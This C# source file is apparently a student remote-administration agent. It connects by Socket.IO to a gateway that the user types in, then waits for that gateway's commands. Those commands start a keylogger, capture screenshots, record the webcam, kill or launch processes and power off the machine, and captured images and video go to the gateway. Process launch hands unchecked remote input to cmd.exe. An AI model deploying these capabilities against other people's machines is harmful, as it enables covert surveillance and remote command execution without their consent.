using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;
using SocketIOClient;
using SocketIOClient.Transport;
using System.Text.Json;
using System.Runtime.InteropServices.Marshalling;
using System.Runtime.Versioning;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;


namespace Server
{
    class Program
    {
        static SocketIOClient.SocketIO? Client = null;
        static readonly object SendLock = new();
        static CancellationTokenSource? ProcessMonitorCTS = null;
        static CancellationTokenSource? ApplicationMonitorCTS = null;
        static readonly KeyLogger KeyLogger = new KeyLogger();
        static Dictionary<string, string> StartableApplications = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);

        static async Task Main()
        {
            Console.WriteLine("Server > Server Starting...");
            while (true)
            {
                Console.Write("Server > Input Gateway IP: ");
                string? GatewayIP = Console.ReadLine();
                Console.Write("Server > Input Gateway Port: ");
                string? GatewayPort = Console.ReadLine();

                string GatewayURL = $"http://{GatewayIP}:{GatewayPort}";

                try
                {
                    Client = new SocketIOClient.SocketIO(GatewayURL, new SocketIOOptions
                    {
                        Reconnection = false,
                        Transport = TransportProtocol.WebSocket
                    });
                    Console.WriteLine("Server > SocketIO created.");
                }
                catch (Exception Ex)
                {
                    Console.WriteLine("Server > " + Ex.ToString());
                    return;
                }

                Client.OnConnected += async (Sender, E) =>
                {
                    Console.WriteLine("Server > Connected to Gateway");
                    await Client.EmitAsync("Server:Register", new { IP = GetLocalIPv4(), Port = "8080" });
                };

                Client.OnDisconnected += (Sender, E) =>
                {
                    Console.WriteLine("Server > Disconnected from Gateway");
                };

                Client.On("Server:Connect:Success", Response =>
                {
                    var Data = Response.GetValue<dynamic>();
                    GetStartableApplication(SendData);
                    Console.WriteLine("Server > Client connected via Gateway" + Data.ClientID);
                });

                Client.On("Server:Connect:Error:ClientDisconnected", Response =>
                {
                    Console.WriteLine("Server > Client disconnected via Gateway");
                });

                Client.On("Server:Disconnect", Response =>
                {
                    Console.WriteLine("Server > Client disconnected via Gateway");
                    StopProcessMonitor();
                    StopApplicationMonitor();
                    KeyLogger.StopKeyLogger();
                });

                Client.On("Process:Kill", Response =>
                {
                    int PID = Response.GetValue<int>();
                    KillProcess(PID, SendData);
                });

                Client.On("Process:Start", Response =>
                {
                    string Input = Response.GetValue<string>();
                    StartProcess(Input, SendData);
                });

                Client.On("Process:Subscribe", Response =>
                {
                    Console.WriteLine("Server > Client subscribed to process updates.");
                    StartProcessMonitor(SendData);
                });

                Client.On("Process:Unsubscribe", Response =>
                {
                    Console.WriteLine("Server > Client unsubscribed from process updates.");
                    StopProcessMonitor();
                });

                Client.On("Application:Subscribe", Response =>
                {
                    Console.WriteLine("Server > Client subscribed to app updates.");
                    StartApplicationMonitor(SendData);
                });

                Client.On("Application:Unsubscribe", Response =>
                {
                    Console.WriteLine("Server > Client unsubscribed from app updates.");
                    StopApplicationMonitor();
                });

                Client.On("KeyLogger:Start", Response =>
                {
                    Console.WriteLine("Server > Client requested keylogger start.");
                    KeyLogger.StartKeyLogger(SendData);
                });

                Client.On("KeyLogger:Print", Response =>
                {
                    Console.WriteLine("Server > Client requested keylogger print.");
                    KeyLogger.PrintKeyLogger();
                });

                Client.On("KeyLogger:Stop", Response =>
                {
                    Console.WriteLine("Server > Client requested keylogger stop.");
                    KeyLogger.StopKeyLogger();
                });

                Client.On("Screenshot:Take", Response =>
                {
                    Console.WriteLine("Client requested screenshot.");
                    Capture(SendData);
                });

                Client.On("Webcam:Record", Response =>
                {
                    int Duration = Response.GetValue<int>();
                    Console.WriteLine($"Server > Client requested webcam recording: {Duration}s");
                    Record(Duration, SendData);
                });

                Client.On("Controller:ShutDown", Response =>
                {
                    Console.WriteLine("Server > Client requested SHUTDOWN.");
                    ControllerShutDown();
                });

                Client.On("Controller:Reboot", Response =>
                {
                    Console.WriteLine("Server > Client requested REBOOT.");
                    ControllerReboot();
                });

                Client.On("Controller:Hibernate", Response =>
                {
                    Console.WriteLine("Server > Client requested HIBERNATE.");
                    ControllerHibernate();
                });

                Client.On("Controller:Sleep", Response =>
                {
                    Console.WriteLine("Server > Client requested SLEEP.");
                    ControllerSleep();
                });

                Client.On("Controller:Lock", Response =>
                {
                    Console.WriteLine("Server > Client requested LOCK.");
                    ControllerLock();
                });

                Client.On("Ping", Response =>
                {
                    int Ping = Response.GetValue<int>();
                    Client.EmitAsync("Pong", Ping);
                });

                try
                {
                    await Client.ConnectAsync();
                    Console.WriteLine("Server > Connected (ConnectAsync returned)");
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Server > Connect Error > " + ex);
                }

                await Task.Delay(-1);
            }
        }

        static void SendData(string EventName, object Data)
        {
            lock (SendLock)
            {
                try
                {
                    if (Client != null && Client.Connected)
                    {
                        Client.EmitAsync(EventName, Data);
                    }
                }
                catch (Exception Ex)
                {
                    Console.WriteLine($"Server > Send error: {Ex.Message}");
                }
            }
        }

        static void KillProcess(int PID, Action<string, object> Callback)
        {
            var _Process = Process.GetProcessById(PID);
            try
            {
                _Process.Kill(true);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Server > Failed to kill process {PID}: {ex.Message}");
                Callback("Process:Killed", new
                {
                    Status = "Failed",
                    PID = PID,
                    ProcessName = "_Process.ProcessName"
                });
                return;
            }
            Console.WriteLine($"Server > Killed process {_Process.ProcessName}");
            Callback("Process:Killed", new
            {
                Status = "Success",
                PID = PID,
                ProcessName = _Process.ProcessName
            });
        }

        static void StartProcess(string Input, Action<string, object> Callback)
        {
            Console.WriteLine(Input);
            if (string.IsNullOrWhiteSpace(Input))
            {
                Console.WriteLine("Server > Failed to start process: Input is null or whitespace");
                return;
            }
            Console.WriteLine("Server > Starting process: " + Input);
            string ApplicationPath = "";
            if (StartableApplications.ContainsKey(Input))
            {
                ApplicationPath = StartableApplications[Input];
            }
            else
            {
                ApplicationPath = Input;
            }
            Console.WriteLine(ApplicationPath);
            try
            {
                Process.Start("cmd.exe", "/c " + "\"" + ApplicationPath + "\"");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Server > Failed to start process {Input}: {ex.Message}");
                Callback("Process:Started", new
                {
                    Status = "Failed",
                    Name = Input
                });
                return;
            }
            Console.WriteLine($"Server > Started process {Input}");
            Callback("Process:Started", new
            {
                Status = "Success",
                Name = Input
            });
        }

        static void GetStartableApplication(Action<string, object> Callback)
        {
            string CommonStart = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartMenu);
            string UserStart = Environment.GetFolderPath(Environment.SpecialFolder.StartMenu);

            string[] MenuFolders =
            {
                Path.Combine(CommonStart, "Programs"),
                Path.Combine(UserStart, "Programs")
            };

            foreach (var Folder in MenuFolders)
            {
                if (!Directory.Exists(Folder)) continue;

                foreach (var Lnk in Directory.EnumerateFiles(Folder, "*.lnk", SearchOption.AllDirectories))
                {
                    string Name = Path.GetFileNameWithoutExtension(Lnk);
                    if (!string.IsNullOrWhiteSpace(Name))
                    {
                        string TargetPath = "";
                        try
                        {
                            TargetPath = GetShortcutTarget(Lnk);
                        }
                        catch
                        {
                            TargetPath = "";
                        }

                        StartableApplications[Name] = TargetPath;
                    }
                }
            }

            // Scan registry uninstall entries
            string[] uninstallKeys =
            {
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            };

            foreach (var Root in new[] { Registry.LocalMachine, Registry.CurrentUser })
            {
                foreach (var Path in uninstallKeys)
                {
                    using var Key = Root.OpenSubKey(Path);
                    if (Key == null) continue;

                    foreach (string Sub in Key.GetSubKeyNames())
                    {
                        using var SubKey = Key.OpenSubKey(Sub);
                        if (SubKey == null) continue;

                        string? DisplayName = SubKey.GetValue("DisplayName") as string;
                        if (!string.IsNullOrWhiteSpace(DisplayName))
                        {
                            if (!StartableApplications.ContainsKey(DisplayName))
                                StartableApplications[DisplayName] = "";
                        }
                    }
                }
            }

            var formatted = StartableApplications
                .OrderBy(x => x.Key)
                .Select(x => new { Name = x.Key, Path = x.Value })
                .ToArray();

            Callback("Application:Startable", formatted);
        }

        static void Record(int Duration, Action<string, object> Callback)
        {
            Task.Run(() =>
            {
                try
                {
                    string LocalDatetime = DateTimeOffset.Now.ToUnixTimeMilliseconds().ToString();

                    string FileName = $"{LocalDatetime}.mp4";
                    string FilePath = Path.Combine(AppContext.BaseDirectory, FileName);

                    // Bắt đầu ghi video
                    using (var CaptureDevice = new OpenCvSharp.VideoCapture(0))
                    {
                        if (!CaptureDevice.IsOpened())
                        {
                            Console.WriteLine("Server > Failed to open webcam.");
                            return;
                        }

                        int Width = CaptureDevice.FrameWidth;
                        int Height = CaptureDevice.FrameHeight;
                        double FPS = 30;

                        using (var VideoWriter = new OpenCvSharp.VideoWriter(FilePath, OpenCvSharp.FourCC.FromString("avc1"), FPS, new OpenCvSharp.Size(Width, Height)))
                        {
                            if (!VideoWriter.IsOpened())
                            {
                                Console.WriteLine("Server > Failed to open video writer.");
                                return;
                            }

                            DateTime Start = DateTime.Now;
                            using (OpenCvSharp.Mat Frame = new OpenCvSharp.Mat())
                            {
                                while ((DateTime.Now - Start).TotalSeconds < Duration)
                                {
                                    CaptureDevice.Read(Frame);
                                    if (Frame.Empty()) break;
                                    VideoWriter.Write(Frame);
                                }
                            }
                        }
                    }

                    // Gửi Webcam Video hoàn chỉnh
                    if (File.Exists(FilePath))
                    {
                        byte[] Bytes = File.ReadAllBytes(FilePath);
                        string Base64 = Convert.ToBase64String(Bytes);
                        Callback("Webcam:Final", new
                        {
                            TimeStamp = long.Parse(LocalDatetime),
                            Size = Bytes.Length,
                            URL = Base64
                        });
                        Console.WriteLine($"Server > Sent webcam file: {FileName}");
                        File.Delete(FilePath);
                    }
                }
                catch (Exception Ex)
                {
                    Console.WriteLine($"Server > Webcam error: {Ex.Message}");
                }
            });
        }

        static void Capture(Action<string, object> Callback)
        {
            Task.Run(() =>
            {
                try
                {
                    string LocalDatetime = DateTimeOffset.Now.ToUnixTimeMilliseconds().ToString();

                    NativeMethods.SetProcessDPIAware();

                    Rectangle Bounds = Rectangle.Empty;
                    foreach (var Screen in System.Windows.Forms.Screen.AllScreens)
                    {
                        Bounds = Rectangle.Union(Bounds, Screen.Bounds);
                    }

                    using (Bitmap Bitmap = new Bitmap(Bounds.Width, Bounds.Height))
                    {
                        using (Graphics Graphics = Graphics.FromImage(Bitmap))
                        {
                            Graphics.CopyFromScreen(Point.Empty, Point.Empty, Bounds.Size);
                        }
                        using (MemoryStream MemoryStream = new MemoryStream())
                        {
                            Bitmap.Save(MemoryStream, ImageFormat.Jpeg);
                            string Base64 = Convert.ToBase64String(MemoryStream.ToArray());
                            Callback("Screenshot:Final", new
                            {
                                TimeStamp = long.Parse(LocalDatetime),
                                Size = MemoryStream.Length,
                                URL = Base64
                            });
                            Console.WriteLine($"Server > Sent screenshot");
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Server > Screenshot error: {ex.Message}");
                }
            });
        }

        static void StartProcessMonitor(Action<string, object> Callback)
        {
            if (ProcessMonitorCTS != null)
            {
                return;
            }

            ProcessMonitorCTS = new CancellationTokenSource();
            var Token = ProcessMonitorCTS.Token;

            Task.Run(async () =>
            {
                try
                {
                    while (!Token.IsCancellationRequested)
                    {
                        var ProcessList = new List<object>();

                        foreach (var _Process in Process.GetProcesses())
                        {
                            try
                            {
                                if (_Process.Id == 0) continue;
                                if (_Process.ProcessName == "System" || _Process.ProcessName == "Idle") continue;

                                ProcessList.Add(new
                                {
                                    PID = _Process.Id,
                                    Name = _Process.ProcessName,
                                    Memory = FormatBytes(_Process.WorkingSet64)
                                });
                            }
                            catch (Exception Ex)
                            {
                                Console.WriteLine($"Server > ProcessMonitor error: {Ex.Message}");
                            }
                        }
                        Callback?.Invoke("Process:List", ProcessList);
                        await Task.Delay(1000, Token);
                    }
                }
                catch (TaskCanceledException)
                {
                    Console.WriteLine("Server > ProcessMonitor canceled");
                }
                catch (Exception Ex)
                {
                    Console.WriteLine($"Server > ProcessMonitor error: {Ex.Message}");
                }
            });
        }

        static void StopProcessMonitor()
        {
            ProcessMonitorCTS?.Cancel();
            ProcessMonitorCTS = null;
        }

        static string FormatBytes(long Bytes)
        {
            string[] Sizes = { "B", "KB", "MB", "GB", "TB" };
            double Length = Bytes;
            int Order = 0;
            while (Length >= 1024 && Order < Sizes.Length - 1)
            {
                Order++;
                Length = Length / 1024;
            }
            return $"{Length:0.##} {Sizes[Order]}";
        }

        static void StartApplicationMonitor(Action<string, object> Callback)
        {
            if (ApplicationMonitorCTS != null)
            {
                return;
            }

            ApplicationMonitorCTS = new CancellationTokenSource();
            var Token = ApplicationMonitorCTS.Token;

            Task.Run(async () =>
            {
                try
                {
                    while (!Token.IsCancellationRequested)
                    {
                        var ApplicationList = new List<object>();

                        foreach (var _Process in Process.GetProcesses())
                        {
                            try
                            {
                                if (_Process.Id == 0) continue;
                                if (_Process.ProcessName == "System" || _Process.ProcessName == "Idle") continue;
                                if (String.IsNullOrEmpty(_Process.MainWindowTitle)) continue;
                                ApplicationList.Add(new
                                {
                                    PID = _Process.Id,
                                    Name = _Process.ProcessName,
                                    Title = _Process.MainWindowTitle,
                                    Memory = FormatBytes(_Process.WorkingSet64)
                                });
                            }
                            catch (Exception Ex)
                            {
                                Console.WriteLine($"Server > ProcessMonitor error: {Ex.Message}");
                            }
                        }
                        Callback?.Invoke("Application:List", ApplicationList);
                        await Task.Delay(1000, Token);
                    }
                }
                catch (TaskCanceledException)
                {
                    Console.WriteLine("Server > ApplicationMonitor canceled");
                }
                catch (Exception Ex)
                {
                    Console.WriteLine($"Server > ApplicationMonitor error: {Ex.Message}");
                }
            });
        }

        static void StopApplicationMonitor()
        {
            ApplicationMonitorCTS?.Cancel();
            ApplicationMonitorCTS = null;
        }

        static void ControllerShutDown()
        {
            Process.Start(new ProcessStartInfo("shutdown", "/s /t 0") { CreateNoWindow = true, UseShellExecute = true });
        }

        static void ControllerReboot()
        {
            Process.Start(new ProcessStartInfo("shutdown", "/r /t 0") { CreateNoWindow = true, UseShellExecute = true });
        }

        static void ControllerHibernate()
        {
            NativeMethods.SetSuspendState(true, true, true);
        }

        static void ControllerSleep()
        {
            NativeMethods.SetSuspendState(false, true, true);
        }

        static void ControllerLock()
        {
            NativeMethods.LockWorkStation();
        }

        static string GetShortcutTarget(string shortcutPath)
        {
            try
            {
                Type? WshShellType = Type.GetTypeFromProgID("WScript.Shell");
                if (WshShellType == null)
                    return "";

                dynamic Shell = Activator.CreateInstance(WshShellType)!;
                dynamic Shortcut = Shell.CreateShortcut(shortcutPath);
                string? Target = Shortcut.TargetPath;
                return Target ?? "";
            }
            catch
            {
                return "";
            }
        }

        static string GetLocalIPv4()
        {
            foreach (var NetworkInterface in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (NetworkInterface.OperationalStatus != OperationalStatus.Up) continue;
                if (NetworkInterface.NetworkInterfaceType == NetworkInterfaceType.Loopback) continue;
                if (NetworkInterface.NetworkInterfaceType == NetworkInterfaceType.Tunnel) continue;

                var Properties = NetworkInterface.GetIPProperties();

                foreach (var IP in Properties.UnicastAddresses)
                {
                    if (IP.Address.AddressFamily == AddressFamily.InterNetwork)
                    {
                        return IP.Address.ToString();
                    }
                }
            }

            return "127.0.0.1";
        }
        
        static class NativeMethods
        {
            [DllImport("user32.dll")]
            public static extern bool LockWorkStation();

            [DllImport("user32.dll")]
            public static extern bool SetProcessDPIAware();

            [DllImport("PowrProf.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            public static extern bool SetSuspendState(bool Hibernate, bool ForceCritical, bool DisableWakeEvent);
        }
    }
}